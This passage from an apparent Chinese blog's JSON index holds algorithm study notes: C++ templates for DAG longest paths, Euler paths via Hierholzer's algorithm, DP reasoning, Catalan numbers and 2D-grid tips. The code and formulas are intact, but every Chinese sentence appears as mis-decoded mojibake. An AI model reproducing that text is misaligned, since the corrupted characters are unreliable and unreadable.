\n---\n\n###  **ğŸŸ¡ æ¨¡æ¿ 2ï¼šå›ºå®šæºç‚¹ + ä¸ä¿è¯**Â **u < v**  \n\n> éœ€è¦è‡ªå·±è·‘ Kahn æ‹“æ‰‘\n\n```cpp\nconst long long NEG = -(1LL << 60);\nvector<long long> dist(n+1, NEG);\ndist[src] = 0;\n\nqueue<int> q;\nvector<int> indeg(n+1, 0);\n// è¯»è¾¹æ—¶ç»Ÿè®¡ indeg[v]++\n\nfor (int i = 1; i <= n; ++i) \n    if (indeg[i] == 0) q.push(i);\n\nwhile (!q.empty()) {\n    int u = q.front(); q.pop();\n    if (dist[u] != NEG) { // æºç‚¹å¯è¾¾æ‰è½¬ç§»\n        for (auto [v, w] : adj[u]) {\n            dist[v] = max(dist[v], dist[u] + w);\n            if (--indeg[v] == 0) q.push(v);\n        }\n    } else {\n        for (auto [v, w] : adj[u]) \n            if (--indeg[v] == 0) q.push(v);\n    }\n}\n```\n\n- **é€‚ç”¨**ï¼šæ—  u < v ä¿è¯ï¼Œä½†é¢˜ç›®ç»™çš„æ˜¯ DAGã€‚\n- **ç»“æœ**ï¼š`dist[v]` æ˜¯ä»æŒ‡å®šæºç‚¹åˆ° v çš„æœ€é•¿è·¯ã€‚\n---\n\n###  **ğŸ”´ æ¨¡æ¿ 3ï¼šå…¨å›¾æœ€é•¿è·¯å¾„ï¼ˆä»»æ„æº â†’ ä»»æ„ç‚¹ï¼‰**\n> å…ˆæ‰¾æ‰€æœ‰å…¥åº¦ 0 çš„ç‚¹ä½œä¸ºæº\n\n```cpp\nconst long long NEG = -(1LL << 60);\nvector<long long> dist(n+1, NEG);\n\nqueue<int> q;\nvector<int> indeg(n+1, 0);\n// è¯»è¾¹æ—¶ç»Ÿè®¡ indeg[v]++\n\nfor (int i = 1; i <= n; ++i) {\n    if (indeg[i] == 0) {\n        dist[i] = 0; // å¤šæºèµ·ç‚¹\n        q.push(i);\n    }\n}\n\nwhile (!q.empty()) {\n    int u = q.front(); q.pop();\n    if (dist[u] != NEG) {\n        for (auto [v, w] : adj[u]) {\n            dist[v] = max(dist[v], dist[u] + w);\n            if (--indeg[v] == 0) q.push(v);\n        }\n    } else {\n        for (auto [v, w] : adj[u]) \n            if (--indeg[v] == 0) q.push(v);\n    }\n}\n\nlong long ans = *max_element(dist.begin(), dist.end());\n```\n\n- **é€‚ç”¨**ï¼šè¦æ±‚æ•´ä¸ª DAG ä¸Šçš„æœ€é•¿è·¯ã€‚\n- **ç»“æœ**ï¼šans å°±æ˜¯æœ€é•¿è·¯å¾„çš„é•¿åº¦ã€‚\n    \n\n---\n\n### **ğŸ“Œ å°æç¤º**\n- è®°å¾—ç”¨ long longï¼Œé¿å…è·¯å¾„å’Œçˆ† intã€‚\n- NEG è¦è¶³å¤Ÿå°ï¼Œä¸ç„¶ä¼šè¢« +w è¯¯æ›´æ–°ã€‚\n- å¦‚æœè¦è¾“å‡ºå…·ä½“è·¯å¾„ï¼Œå¯ä»¥é¢å¤–è®°å½• `pre[v]` æ¥å›æº¯ã€‚\n    \n\n---\n\n## æ¬§æ‹‰è·¯å¾„\n\n###  å»ºæ¨¡è§¦å‘å™¨\né¢˜é¢ä¸€æ—¦å‡ºç°ï¼š**â€œæŠŠæ¯ä¸ªå•è¯éƒ½ç”¨ä¸€æ¬¡ã€èƒ½è¿å°±è¿ã€è¾“å‡ºæ•´æ¡é“¾â€**\nâ†’ ä¸‹æ„è¯†è”æƒ³åˆ°ï¼š**æ¬§æ‹‰è·¯å¾„ï¼ˆè¾¹å…¨ç”¨ä¸€æ¬¡ï¼‰**\n- ç‚¹ = å­—æ¯ï¼ˆa..zï¼‰\n- è¾¹ = å•è¯ï¼ˆs[0] â†’ s.back()ï¼Œè¾¹ä¸Šå¸¦ç€å•è¯ï¼‰\n###  å…ˆéªŒåˆ¤å®šï¼ˆèƒ½ä¸èƒ½å­˜åœ¨ï¼‰\næœ‰å‘å›¾æ¬§æ‹‰è·¯å¾„å……è¦æ¡ä»¶ï¼ˆå¿½ç•¥æ–¹å‘è¿é€š + å…¥å‡ºåº¦æ¡ä»¶ï¼‰ï¼š\n- å¿½ç•¥æ–¹å‘åï¼Œæ‰€æœ‰**å‡ºç°è¿‡çš„ç‚¹**åœ¨åŒä¸€è¿é€šåˆ†é‡ï¼ˆå¦åˆ™å¿…ç„¶â€œæ–­é“¾â€ï¼‰ã€‚\n- å…¥/å‡ºåº¦ï¼š\n    - æ¬§æ‹‰å›è·¯ï¼šæ‰€æœ‰ç‚¹ in = out\n    - æ¬§æ‹‰è·¯å¾„ï¼šæ°æœ‰ä¸€ä¸ªç‚¹ out = in + 1ï¼ˆèµ·ç‚¹ï¼‰ï¼Œä¸€ä¸ªç‚¹ in = out + 1ï¼ˆç»ˆç‚¹ï¼‰ï¼Œå…¶ä½™ in = out\n    - å…¶ä»–æƒ…å†µ â†’ ä¸å­˜åœ¨\n\n### **èµ·ç‚¹æ€ä¹ˆâ€œè‡ªå·±é€‰â€**\n- è‹¥å­˜åœ¨è·¯å¾„ï¼ˆéå›è·¯ï¼‰ï¼š**èµ·ç‚¹ = out = in + 1 çš„ç‚¹**ï¼ˆå”¯ä¸€ï¼‰ã€‚\n- è‹¥æ˜¯å›è·¯ï¼šç†è®ºä¸Šä»»æ„æœ‰è¾¹çš„ç‚¹éƒ½å¯åšèµ·ç‚¹ã€‚\n    ä¸ºäº†**å­—å…¸åºæœ€å°**çš„æˆé“¾ï¼Œä½ çš„åšæ³•ï¼ˆæ¯ä¸ªç‚¹çš„å‡ºè¾¹æŒ‰å­—å…¸åºå–æœ€å°ï¼‰å·²ä¿è¯æ•´ä½“æœ€å°ï¼›èµ·ç‚¹é€šå¸¸é€‰**æœ€å°å­—æ¯ä¸”å‡ºåº¦>0**å°±è¡Œã€‚\n\n### ä¸ºå•¥â€œå¯¹èµ·ç‚¹åš DFS å°±å¯¹äº†â€\næ ¸å¿ƒæ˜¯ **Hierholzer ç®—æ³•**ï¼ˆæ¬§æ‹‰è·¯/å›è·¯çš„æ ‡å‡†æ„é€ ï¼‰ï¼š\n- åœ¨å½“å‰ç‚¹åå¤â€œå–ä¸€æ¡å°šæœªç”¨è¿‡çš„å‡ºè¾¹â€èµ°ä¸‹å»ï¼ˆä½ æŒ‰å­—å…¸åºå–æœ€å°ï¼‰ï¼›\n- æ²¡è·¯å¯èµ°å°±**å›æº¯**ï¼ŒæŠŠåˆšèµ°å®Œçš„è¾¹å¯¹åº”çš„å•è¯**å‹å…¥ç­”æ¡ˆ**ï¼›\n- å› ä¸ºè¾¹æ˜¯â€œèµ°å®Œæ‰æ”¶å½•â€ï¼Œæœ€åå¾—åˆ°çš„æ˜¯**é€†åº**ï¼Œæ‰€ä»¥è¦ reverseã€‚\n    \n> æ­£ç¡®æ€§çš„ç›´è§‰ï¼šåƒåœ¨ä¸€ä¸ªåŒºåŸŸé‡Œâ€œæŠ½çº¿â€ï¼ŒæŠ½åˆ°æŠ½ä¸åŠ¨äº†å°±å°å£è®°å½•ï¼Œæœ€ç»ˆæŠŠæ‰€æœ‰è¾¹éƒ½æŠ½èµ°ä¸€æ¬¡ï¼Œæ‹¼èµ·æ¥å°±æ˜¯æ¬§æ‹‰è·¯ï¼›ä½ æŒ‰æœ€å°è¾¹ä¼˜å…ˆèµ°ï¼Œå¾—åˆ°çš„å°±æ˜¯å­—å…¸åºæœ€å°ã€‚  \n###  ä¸ºä»€ä¹ˆâ€œdp/æœ€çŸ­è·¯/æ‹“æ‰‘â€éƒ½ä¸åˆé€‚\n- è¦æ±‚â€œ**æ¯æ¡è¾¹æ°å¥½ä¸€æ¬¡**â€æ˜¯æ¬§æ‹‰é—®é¢˜çš„ä¸“å±ä¿¡å·ï¼›\n- æ‹“æ‰‘/æœ€çŸ­è·¯/DPå…³å¿ƒçš„æ˜¯â€œç‚¹/è·¯å¾„æƒå€¼/æ¬¡æ•°â€ï¼Œä¸æ˜¯â€œè¾¹ä½¿ç”¨ä¸€æ¬¡ä¸”å…¨è¦†ç›–â€ã€‚\n- æ‰€ä»¥è¿™é¢˜ä¸æ˜¯â€œæ‰¾æœ€ä¼˜â€ï¼Œè€Œæ˜¯â€œæ‰¾ä¸€æ¡æ°å¥½è¦†ç›–å…¨éƒ¨è¾¹çš„é“â€ï¼Œè‡ªç„¶è½åœ¨ Hierholzerã€‚\n### **å¯å¤ç”¨â€œæ¨å¯¼æ¸…å•â€**\n1. ç‚¹=å­—æ¯ï¼Œè¾¹=å•è¯ï¼ˆé¦–â†’å°¾ï¼‰ï¼Œè¾¹ä¸Šå­˜å­—ç¬¦ä¸²\n2. ç»Ÿè®¡ in/outï¼Œå¹¶è®°å½•å‡ºç°è¿‡çš„ç‚¹\n3. å¿½ç•¥æ–¹å‘åšè¿é€šæ€§æ£€æŸ¥\n4. åˆ¤åº¦æ•°ï¼šè·¯å¾„æ€/å›è·¯æ€ï¼›\n5. èµ·ç‚¹ï¼šout=in+1 çš„ç‚¹ï¼›è‹¥å›è·¯é€‰æœ€å°å‡ºåº¦>0 çš„ç‚¹\n6. å„ `adj[u]` å‡åºï¼Œéå†æ—¶ç”¨ back()+pop_back()\n7. è·‘ Hierholzerï¼ˆé€’å½’/æ ˆï¼‰ï¼Œæ”¶é›†è¾¹ï¼Œé€†åºè¾“å‡ºç”¨ . ç›¸è¿\n8. éªŒè¯è¾¹æ•°æ˜¯å¦éƒ½ç”¨åˆ°ï¼ˆ`res.size()==n`ï¼‰\nè§ luogu [P1127](https://www.luogu.com.cn/problem/P1127)\n```cpp\n#include<iostream>\n#include<vector>\n#include<algorithm>\n#include<string>\nusing namespace std;\n\nvoid dfs(int u,vector<vector<string>>&adj,vector<string>&res){\n    while(!adj[u].empty()){\n        string s=adj[u].front();\n        adj[u].erase(adj[u].begin());\n        dfs(s.back()-'a',adj,res);\n        res.push_back(s);\n    }\n}\n\nint main(){\n    // ä¸€ä¸ªæ¬§æ‹‰è·¯å¾„éå†çš„å›¾ï¼Ÿ\n    int n;\n    cin>>n;\n    vector<string>str(n);\n    for(int i=0;i<n;i++) cin>>str[i];\n    vector<vector<string>>adj(26);\n    for(string &s:str){\n        adj[s[0]-'a'].push_back(s); //å­˜å•è¯å»å»ºç«‹æ˜ å°„å…³ç³»\n    }\n    for(auto &v:adj) sort(v.begin(),v.end()); //ä¿è¯å­—æ¯åº\n    vector<int>indegree(26,0),outdegree(26,0);\n    for(int i=0;i<26;i++){\n        for(string &s:adj[i]){\n            outdegree[i]++;\n            indegree[s.back()-'a']++;\n        }\n    }\n    // æ¬§æ‹‰è·¯å¾„å¿…è¦æ¡ä»¶ï¼šæœ‰ä¸€ä¸ªèµ·ç‚¹æ»¡è¶³ outdegree-indegree=1ï¼Œæœ‰ä¸€ä¸ªç»ˆç‚¹æ»¡è¶³ indegree-outdegree=1ï¼Œå…¶ä½™ç‚¹indegree=outdegree\n    int start=-1,end=-1;\n    for(int i=0;i<26;i++){\n        if(outdegree[i]-indegree[i]==1){\n            if(start==-1) start=i;\n            else { //å¤šäºä¸€ä¸ªèµ·ç‚¹\n                cout<<\"***\"<<endl;\n                return 0;\n            }\n        }\n        else if(indegree[i]-outdegree[i]==1){\n            if(end==-1) end=i;\n            else { //å¤šäºä¸€ä¸ªç»ˆç‚¹\n                cout<<\"***\"<<endl;\n                return 0;\n            }\n        }\n        else if(indegree[i]!=outdegree[i]){\n            cout<<\"***\"<<endl;\n            return 0;\n        }\n    }\n        vector<string>res;\n        if(start==-1){ //æ²¡æœ‰èµ·ç‚¹ï¼Œè¯´æ˜æ˜¯å›è·¯ï¼Œä»ä»»æ„ç‚¹å¼€å§‹\n            for(int i=0;i<26;i++){\n                if(outdegree[i]>0){\n                    start=i;\n                    break;\n                }\n            }   \n        }\n        dfs(start,adj,res);\n        if(res.size()!=n){ //æ²¡æœ‰éå†å®Œæ‰€æœ‰è¾¹\n            cout<<\"***\"<<endl;\n            return 0;\n        }\n        reverse(res.begin(),res.end());\n        for(int i=0;i<res.size();i++){\n            cout<<res[i]<<(i==res.size()-1?\"\":\".\");\n        }\n        return 0;\n    }\n```\n\n## DP\n> â€œæˆ‘è®¾äº†ä¸ª `dp[..]`ï¼Œä½†æ˜¯å®ƒåˆ°åº•åœ¨å¸®æˆ‘ç®—ä»€ä¹ˆï¼Ÿç›®æ ‡åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆè½¬ç§»æ–¹ç¨‹å°±æ˜¯è¿™ä¹ˆå†™ï¼Ÿâ€\n\n---\n\n### **ğŸŒ± åŠ¨æ€è§„åˆ’çš„â€œæ ¸å¿ƒä¸‰é—®â€**\n\næ¯æ¬¡é‡åˆ°é¢˜ç›®æ—¶ï¼Œå¯ä»¥å¼ºè¿«è‡ªå·±å›ç­”è¿™ä¸‰ä¸ªé—®é¢˜ï¼š\n1. **çŠ¶æ€æ˜¯ä»€ä¹ˆï¼Ÿ**\n    - dp[i] / dp[i][j] ä»£è¡¨ä»€ä¹ˆé‡ï¼Ÿ\n    - ä¸€å¥è¯æ¸…æ™°æè¿°ï¼šå®ƒæ˜¯â€œå‰ i ä¸ªç‰©å“çš„æœ€ä¼˜è§£â€è¿˜æ˜¯â€œèµ°åˆ° (i,j) çš„æœ€çŸ­è·¯å¾„â€ï¼Ÿ\n        \n2. **ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Ÿ**\n    - æˆ‘è¦çš„æœ€ç»ˆç­”æ¡ˆæ˜¯ dp[n]ã€è¿˜æ˜¯ max(dp[..])ã€è¿˜æ˜¯ dp[n][m]ï¼Ÿ\n    - æŠŠâ€œè¾“å‡ºéœ€è¦ä»€ä¹ˆâ€å…ˆå¯¹é½ï¼Œé¿å…â€œæˆ‘è®¾çš„çŠ¶æ€è·Ÿç›®æ ‡æ— å…³â€ã€‚\n        \n3. **è½¬ç§»æ€ä¹ˆæ¥ï¼Ÿ**\n    - å½“å‰çŠ¶æ€èƒ½ä»ä»€ä¹ˆå­é—®é¢˜è½¬ç§»è€Œæ¥ï¼Ÿ\n    - æ¯æ¬¡å†™è½¬ç§»çš„æ—¶å€™ï¼Œå¿ƒé‡Œè¦å¯¹åº”ä¸€ä¸ªâ€œå°æ•…äº‹â€ï¼šæ¯”å¦‚â€œç¬¬ i ä»¶ç‰©å“é€‰/ä¸é€‰â€ï¼Œâ€œä»å·¦è¾¹æˆ–ä¸Šè¾¹èµ°è¿‡æ¥â€ã€‚\n        \n---\n### **ğŸŒ° ä¸¾ä¸ªå°ä¾‹å­**\n> æœ€ç»å…¸ï¼šçˆ¬æ¥¼æ¢¯é—®é¢˜ã€‚æ¯æ¬¡å¯ä»¥èµ° 1 æ­¥æˆ– 2 æ­¥ï¼Œé—®èµ°åˆ°ç¬¬ n å±‚çš„æ–¹æ¡ˆæ•°ã€‚\n1. çŠ¶æ€ï¼š  \n    - dp[i] = åˆ°è¾¾ç¬¬ i å±‚çš„æ–¹æ¡ˆæ•°ã€‚\n        \n2. ç›®æ ‡ï¼š\n    - æˆ‘è¦æ±‚çš„æ˜¯ dp[n]ã€‚\n        \n3. è½¬ç§»ï¼š\n    - èµ°åˆ°ç¬¬ i å±‚ï¼Œè¦ä¹ˆä» i-1 èµ°ä¸€æ­¥ä¸Šæ¥ï¼Œè¦ä¹ˆä» i-2 è·¨ä¸¤æ­¥ä¸Šæ¥ã€‚\n    - æ‰€ä»¥ï¼šdp[i] = dp[i-1] + dp[i-2]ã€‚\n        \nè¿™ä¸ªæ•…äº‹å°±éå¸¸æ¸…æ™°ï¼š**æ¯ä¸ªçŠ¶æ€å¯¹åº”ä¸€ä¸ªé—®é¢˜ï¼Œæ¯ä¸ªè½¬ç§»å¯¹åº”ä¸€ä¸ªé€‰æ‹©ã€‚**\n\n---\n\n### **ğŸ”‘ å°æŠ€å·§**\n\n- ä¸€å®šè¦â€œå†™æ–‡å­—å®šä¹‰â€ï¼šæ¯”å¦‚åœ¨è‰ç¨¿çº¸/æ³¨é‡Šé‡Œå†™æ¸…æ¥š  \n    dp[i][j] = ç”¨å‰ i ä»¶ç‰©å“ã€æ”¾å…¥å®¹é‡ä¸º j çš„èƒŒåŒ…æ—¶èƒ½å¾—åˆ°çš„æœ€å¤§ä»·å€¼ã€‚  \n    â€”â€”è¿™æ ·ä½ æ¯æ¬¡å†™è½¬ç§»çš„æ—¶å€™ï¼Œå°±èƒ½æ£€æŸ¥ï¼šæˆ‘å†™çš„æ¨å¯¼æ˜¯ä¸æ˜¯è·Ÿå®šä¹‰ä¸€è‡´ã€‚\n    \n- ç›®æ ‡ä¸æ¸…æ™°æ—¶ï¼Œå›åˆ°é¢˜ç›®æœ€åä¸€å¥ï¼šâ€œè¦æ±‚çš„æ˜¯â€¦â€¦â€ã€‚\n    æŠŠå®ƒç¿»è¯‘æˆå¯¹åº”çš„ dp çŠ¶æ€ã€‚\n    \n\n---\næ‰€ä»¥â€œæ¯æ¬¡è®¾å®š dp ç›®æ ‡ä¸æ¸…æ™°â€ï¼Œå…¶å®å°±æ˜¯**ç¬¬ 2 æ­¥æ²¡å¯¹é½**ã€‚\nè§£å†³æ–¹æ³•å°±æ˜¯ï¼š\n1. æ˜ç¡®çŠ¶æ€å®šä¹‰ï¼›\n2. æ˜ç¡®æˆ‘è¦çš„ç­”æ¡ˆåœ¨å“ªä¸ªçŠ¶æ€é‡Œï¼›\n3. å†æ¥å†™è½¬ç§»ã€‚\n    \n---\n### å¡ç‰¹å…°æ•°\nç»å…¸æ ˆåºåˆ—ã€‚\n- n ä¸ªå…ƒç´ å…¥æ ˆå‡ºæ ˆï¼Œæ¯ä¸€æ­¥åªèƒ½â€œå…¥â€æˆ–â€œå‡ºâ€ï¼Œä¸”å‡ºæ ˆæ•°ä»ä¸è¶…è¿‡å…¥æ ˆæ•°ï¼ˆå¦åˆ™æ ˆç©ºï¼‰ã€‚\n- è¿™ç­‰ä»·äºæ‹¬å·åºåˆ—æˆ– Dyck è·¯å¾„è®¡æ•°ï¼šåˆæ³•åºåˆ—æ•°é‡ = Câ‚™ã€‚\n\nä¸‰ç§å¸¸ç”¨å…¬å¼\n1.\té€’æ¨ï¼ˆDPï¼Œæœ€å¸¸è§ï¼Œä¹Ÿå°±æ˜¯ä½ ä»£ç é‡Œçš„å¼å­ï¼‰\n\t$C_0=1,\\quad C_n=\\sum_{k=0}^{n-1} C_k\\,C_{n-1-k}$\n\tæ—¶é—´ O(n^2)ã€‚\n\t\n2.\té—­å¼ï¼ˆç»„åˆæ•°ï¼‰\n    $C_n=\\frac{1}{n+1}\\binom{2n}{n}$\n\té€‚åˆç”¨å¤§æ•´æ•°æˆ–é«˜ç²¾åº¦åº“ã€‚\n\t\n3.\tçº¿æ€§é€’æ¨ï¼ˆä»å‰ä¸€é¡¹æ»šåŠ¨æ¨åä¸€é¡¹ï¼‰\n    $C_{n+1}=C_n\\cdot \\frac{4n+2}{n+2}$\næ¯æ­¥ä¸€æ¬¡ä¹˜é™¤ï¼Œæ³¨æ„æ•´é™¤æ— è¯¯å·®ï¼›å®ç°æ—¶æœ€å¥½ç”¨å¤§æ•´æ•°æˆ–å…ˆçº¦åˆ†ã€‚\n\nå°è¡¨ï¼ˆå‰å‡ é¡¹ï¼‰\nn: 1,2,3,4,5,6,7,8,9,10\nCâ‚™: 1,2,5,14,42,132,429,1430,4862,16796\n\næ•´å‹èŒƒå›´æç¤º\n\tâ€¢\tint æœ€å¤šåˆ° $2.1\\times10^9$ï¼›Câ‚â‚‰=1,767,263,190 è¿˜å‹‰å¼ºèƒ½æ”¾ï¼ŒCâ‚‚â‚€=6,564,120,420 å°±æº¢å‡ºäº†ã€‚\n\tâ€¢\tlong long å¯å®‰å…¨åˆ° n=35ï¼ˆCâ‚ƒâ‚…â‰ˆ3.116Ã—10Â¹â¸ < 2â¶Â³âˆ’1ï¼‰ã€‚æ›´å¤§å°±è¦é«˜ç²¾åº¦ã€‚\n\n---\n## äºŒç»´çŸ©é˜µ\näºŒç»´çŸ©é˜µé¢˜ç»™äººçš„å‹è¿«æ„Ÿï¼Œå¾€å¾€ä¸åœ¨ä»£ç é‡ï¼Œè€Œåœ¨äºï¼š\n\tâ€¢\tåæ ‡ç³»çš„æ··ä¹±ï¼šåˆ°åº•æ˜¯ `a[x][y]` è¿˜æ˜¯` a[y][x]`ï¼Ÿä» 1 å¼€å§‹è¿˜æ˜¯ä» 0 å¼€å§‹ï¼Ÿ\n\tâ€¢\téå†æ–¹å‘çš„å¤šæ ·ï¼šä¸Šä¸‹å·¦å³ã€æ–œå¯¹è§’ã€è·³é©¬æ­¥ï¼Œå®¹æ˜“æ¼æ‰æˆ–å†™é”™ã€‚\n\tâ€¢\tè¾¹ç•Œæ¡ä»¶çš„éº»çƒ¦ï¼šæ˜¯ä¸æ˜¯è¶Šç•Œï¼Ÿæ˜¯ä¸æ˜¯è®¿é—®è¿‡ï¼Ÿæ˜¯ä¸æ˜¯è¦å›æº¯ï¼Ÿ\n\tâ€¢\tå¯è§†åŒ–å›°éš¾ï¼šåœ¨è„‘å­é‡Œæƒ³â€œç‚¹å’Œç‚¹çš„å…³ç³»â€æ¯”ä¸€ç»´å¤æ‚å¾ˆå¤šã€‚\n\nçœ‹åˆ°çŸ©é˜µé¢˜ä¼šå®³æ€•ï¼Œå…¶å®æ˜¯å¤§è„‘åœ¨æé†’ä½ â€œè¿™ç±»é¢˜ç»†èŠ‚å¤šã€å®¹æ˜“æ‰å‘â€ã€‚\n\n---\næ€ä¹ˆåŒ–è§£è¿™ç§â€œäºŒç»´ææƒ§ç—‡â€ï¼Ÿ\n\n### æŠ€å·§\n\nä¸€äº›å¾ˆå®ç”¨çš„å°æŠ€å·§ï¼š\n1. å›ºå®šæ¨¡æ¿\nå…ˆå†™å¥½ä¸€ä¸ªæ–¹å‘æ•°ç»„ï¼Œæ¯”å¦‚èµ° 8 ä¸ªæ–¹å‘ï¼š\n\n```cpp\nint dx[8] = {1,1,1,0,0,-1,-1,-1};\nint dy[8] = {1,0,-1,1,-1,1,0,-1};\n```\n\næˆ–è€…åƒé©¬è·³çš„ 8 ä¸ªæ–¹å‘ï¼š\n\n```cpp\nint dx[8] = {1,1,-1,-1,2,2,-2,-2};\nint dy[8] = {2,-2,2,-2,1,-1,1,-1};\n```\n\nä»¥ååªè¦ `for(int d=0;d<8;d++){ nx=x+dx[d]; ny=y+dy[d]; }`ï¼Œå†åŠ è¾¹ç•Œåˆ¤æ–­ã€‚è¿™æ ·å°±ä¸ä¼šä¸€è¾¹æƒ³é¢˜ä¸€è¾¹è¿˜è¦å†™ä¹±ä¸ƒå…«ç³Ÿçš„ if/elseã€‚\n\n2. è¾¹ç•Œåˆ¤æ–­å†™æˆå‡½æ•°\n```cpp\nbool inside(int x,int y,int n){\n    return x>=1 && x<=n && y>=1 && y<=n;\n}\n```\nè¿™æ ·æ¯”ç›´æ¥å†™æ¡ä»¶åˆ¤æ–­è¦æ¸…æ™°ã€å°‘ bugã€‚\n\n3. å…ˆæ‰‹åŠ¨ç”»ä¸€å¼ å°å›¾\næ¯”å¦‚ 3Ã—3ã€4Ã—4ï¼Œç”¨ç¬”ç”»å‡ºæ¥ï¼Œæ ‡è®° BFS çš„æ‰©å±•é¡ºåºï¼Œä½ ä¼šå‘ç°å¾ˆå¤šè§„å¾‹æ›´ç›´è§‚ã€‚\n\n4.\tå°æ•°æ®å…ˆè·‘æš´åŠ›\nå…ˆå†™ BFS/DFS ç‰ˆæœ¬ï¼Œåœ¨ n=5,k=2 è¿™ç§å°èŒƒå›´è·‘å‡ºæ¥ï¼Œæ‰“å°è¿‡ç¨‹ï¼Œå¿ƒé‡Œå°±è¸å®å¤šäº†ã€‚\n\n---\n### å¿ƒæ€\näºŒç»´çŸ©é˜µé¢˜ ä¸æ˜¯ DP çš„ä¸“åˆ©ï¼Œå®ƒå¯ä»¥æ˜¯ BFSï¼ˆå¯è¾¾æ€§ï¼‰ã€DFSï¼ˆè¿é€šå—ï¼‰ã€æ¨¡æ‹Ÿï¼ˆç¿»æ ¼å­ï¼‰ã€æ•°å­¦ï¼ˆå¯¹ç§°æ€§ï¼‰ã€‚ä½ å®³æ€•å…¶å®æ˜¯å› ä¸ºæ²¡æŠŠâ€œçŸ©é˜µâ€å½“ä½œæ™®é€šçš„å›¾ã€‚æŠŠçŸ©é˜µæƒ³æˆä¸€ä¸ªå›¾ï¼Œæ ¼å­æ˜¯èŠ‚ç‚¹ï¼Œå››å‘¨/å…«å‘¨/é©¬æ­¥æ˜¯è¾¹ï¼Œå…¶å®é—®é¢˜å°±æ¸…çˆ½äº†ã€‚\n\n---\n","tags":["å­¦ä¹ ","ç¼–ç¨‹"],"categories":["æ—¥å¸¸å­¦ä¹ ","ç®—æ³•ç§¯ç´¯"]},{"title":"ç¦»æ•£æ•°å­¦ - ç»„åˆæ•°å­¦","url":"/2025/06/05/xue-xi/shu-xue/chi-san-shu-xue-zu-he-shu-xue/","content":"# ç¦»æ•£æ•°å­¦ - ç»„åˆæ•°å­¦\nåªæ˜¯ copyï¼Œæ²¡æœ‰åŠ›æ°”æ•´ç†äº†ã€‚\n\n## å…¬å¼\nè¿™ä¸¤ä¸ªå…¬å¼åœ¨ç»„åˆæ•°å­¦ä¸­éå¸¸æœ‰ç”¨ï¼Œåˆ†åˆ«è§£å†³ä¸åŒç±»å‹çš„é—®é¢˜ã€‚æˆ‘ä»¬æ¥é€ä¸ªè§£é‡Šä¸€ä¸‹å®ƒä»¬çš„æ¥æºå’Œæ€è·¯ï¼š\n\n### 1. å…¬å¼ C(nâˆ’k+1,k): â€œé€‰ k ä¸ªä¸ç›¸é‚»å…ƒç´ â€\n\né—®é¢˜åœºæ™¯ï¼š\nä»æ’æˆä¸€æ’çš„ n ä¸ªä¸åŒå…ƒç´ ä¸­ï¼Œé€‰å‡º k ä¸ªå…ƒç´ ï¼Œè¦æ±‚è¿™ k ä¸ªå…ƒç´ ä¸­ä»»æ„ä¸¤ä¸ªéƒ½ä¸èƒ½ç›¸é‚»ã€‚é—®æœ‰å¤šå°‘ç§é€‰æ³•ï¼Ÿ\n**æ¨å¯¼æ€è·¯ (è½¬æ¢æ³•/æ˜ å°„æ³•):**\n1. **æ ‡è®°å…ƒç´ ä½ç½®ï¼š** å‡è®¾è¿™ n ä¸ªå…ƒç´ çš„ä½ç½®ç¼–å·ä¸º 1,2,â€¦,nã€‚æˆ‘ä»¬è¦é€‰å‡º k ä¸ªä½ç½® x1â€‹,x2â€‹,â€¦,xkâ€‹ï¼Œå¹¶ä¸”å®ƒä»¬æ»¡è¶³ 1â‰¤x1â€‹<x2â€‹<â€¦<xkâ€‹â‰¤nã€‚    \n2. **ä¸ç›¸é‚»æ¡ä»¶ï¼š** â€œä»»æ„ä¸¤ä¸ªä¸ç›¸é‚»â€æ„å‘³ç€ï¼š\n    - x2â€‹âˆ’x1â€‹â‰¥2\n    - x3â€‹âˆ’x2â€‹â‰¥2\n    - ...\n    - xkâ€‹âˆ’xkâˆ’1â€‹â‰¥2\n3. **å˜é‡ä»£æ¢ (æ ¸å¿ƒæŠ€å·§)ï¼š** ä¸ºäº†æ¶ˆé™¤â€œâ‰¥2â€è¿™ä¸ªä¸æ–¹ä¾¿å¤„ç†çš„æ¡ä»¶ï¼Œæˆ‘ä»¬å¼•å…¥ä¸€ç»„æ–°çš„å˜é‡ y1â€‹,y2â€‹,â€¦,ykâ€‹ï¼š\n    - y1â€‹=x1â€‹\n    - y2â€‹=x2â€‹âˆ’1\n    - y3â€‹=x3â€‹âˆ’2\n    - ...\n    - ykâ€‹=xkâ€‹âˆ’(kâˆ’1)\n4. **åˆ†ææ–°å˜é‡çš„æ€§è´¨ï¼š**\n    - ç”±äº x1â€‹â‰¥1ï¼Œæ‰€ä»¥ y1â€‹â‰¥1ã€‚\n    - y2â€‹âˆ’y1â€‹=(x2â€‹âˆ’1)âˆ’x1â€‹=(x2â€‹âˆ’x1â€‹)âˆ’1ã€‚å› ä¸º x2â€‹âˆ’x1â€‹â‰¥2ï¼Œæ‰€ä»¥ (x2â€‹âˆ’x1â€‹)âˆ’1â‰¥1ã€‚è¿™æ„å‘³ç€ y2â€‹>y1â€‹ã€‚\n    - åŒç†ï¼Œy3â€‹âˆ’y2â€‹=(x3â€‹âˆ’2)âˆ’(x2â€‹âˆ’1)=(x3â€‹âˆ’x2â€‹)âˆ’1â‰¥1ã€‚è¿™æ„å‘³ç€ y3â€‹>y2â€‹ã€‚\n    - ä¾æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬å¾—åˆ° 1â‰¤y1â€‹<y2â€‹<â€¦<ykâ€‹ã€‚\n    - ç°åœ¨çœ‹ ykâ€‹ çš„ä¸Šé™ï¼šykâ€‹=xkâ€‹âˆ’(kâˆ’1)ã€‚å› ä¸º xkâ€‹â‰¤nï¼Œæ‰€ä»¥ ykâ€‹â‰¤nâˆ’(kâˆ’1)=nâˆ’k+1ã€‚\n5. é—®é¢˜è½¬åŒ–ï¼š\n    æˆ‘ä»¬æˆåŠŸåœ°å°†â€œä» 1,â€¦,n ä¸­é€‰ k ä¸ªä¸ç›¸é‚»çš„æ•° xiâ€‹â€çš„é—®é¢˜ï¼Œè½¬åŒ–ä¸ºäº†â€œä» 1,â€¦,nâˆ’k+1 ä¸­é€‰ k ä¸ªä¸åŒçš„æ•° yiâ€‹â€çš„é—®é¢˜ã€‚\n    ä» nâˆ’k+1 ä¸ªæ•°ä¸­é€‰ k ä¸ªä¸åŒçš„æ•°ï¼Œé€‰æ³•æ•°é‡å°±æ˜¯ç»„åˆæ•° C(nâˆ’k+1,k)ã€‚\n    \n\n**å¦ä¸€ç§ç›´è§‚ç†è§£ (æ’ç©ºæ³•å˜ç§ / 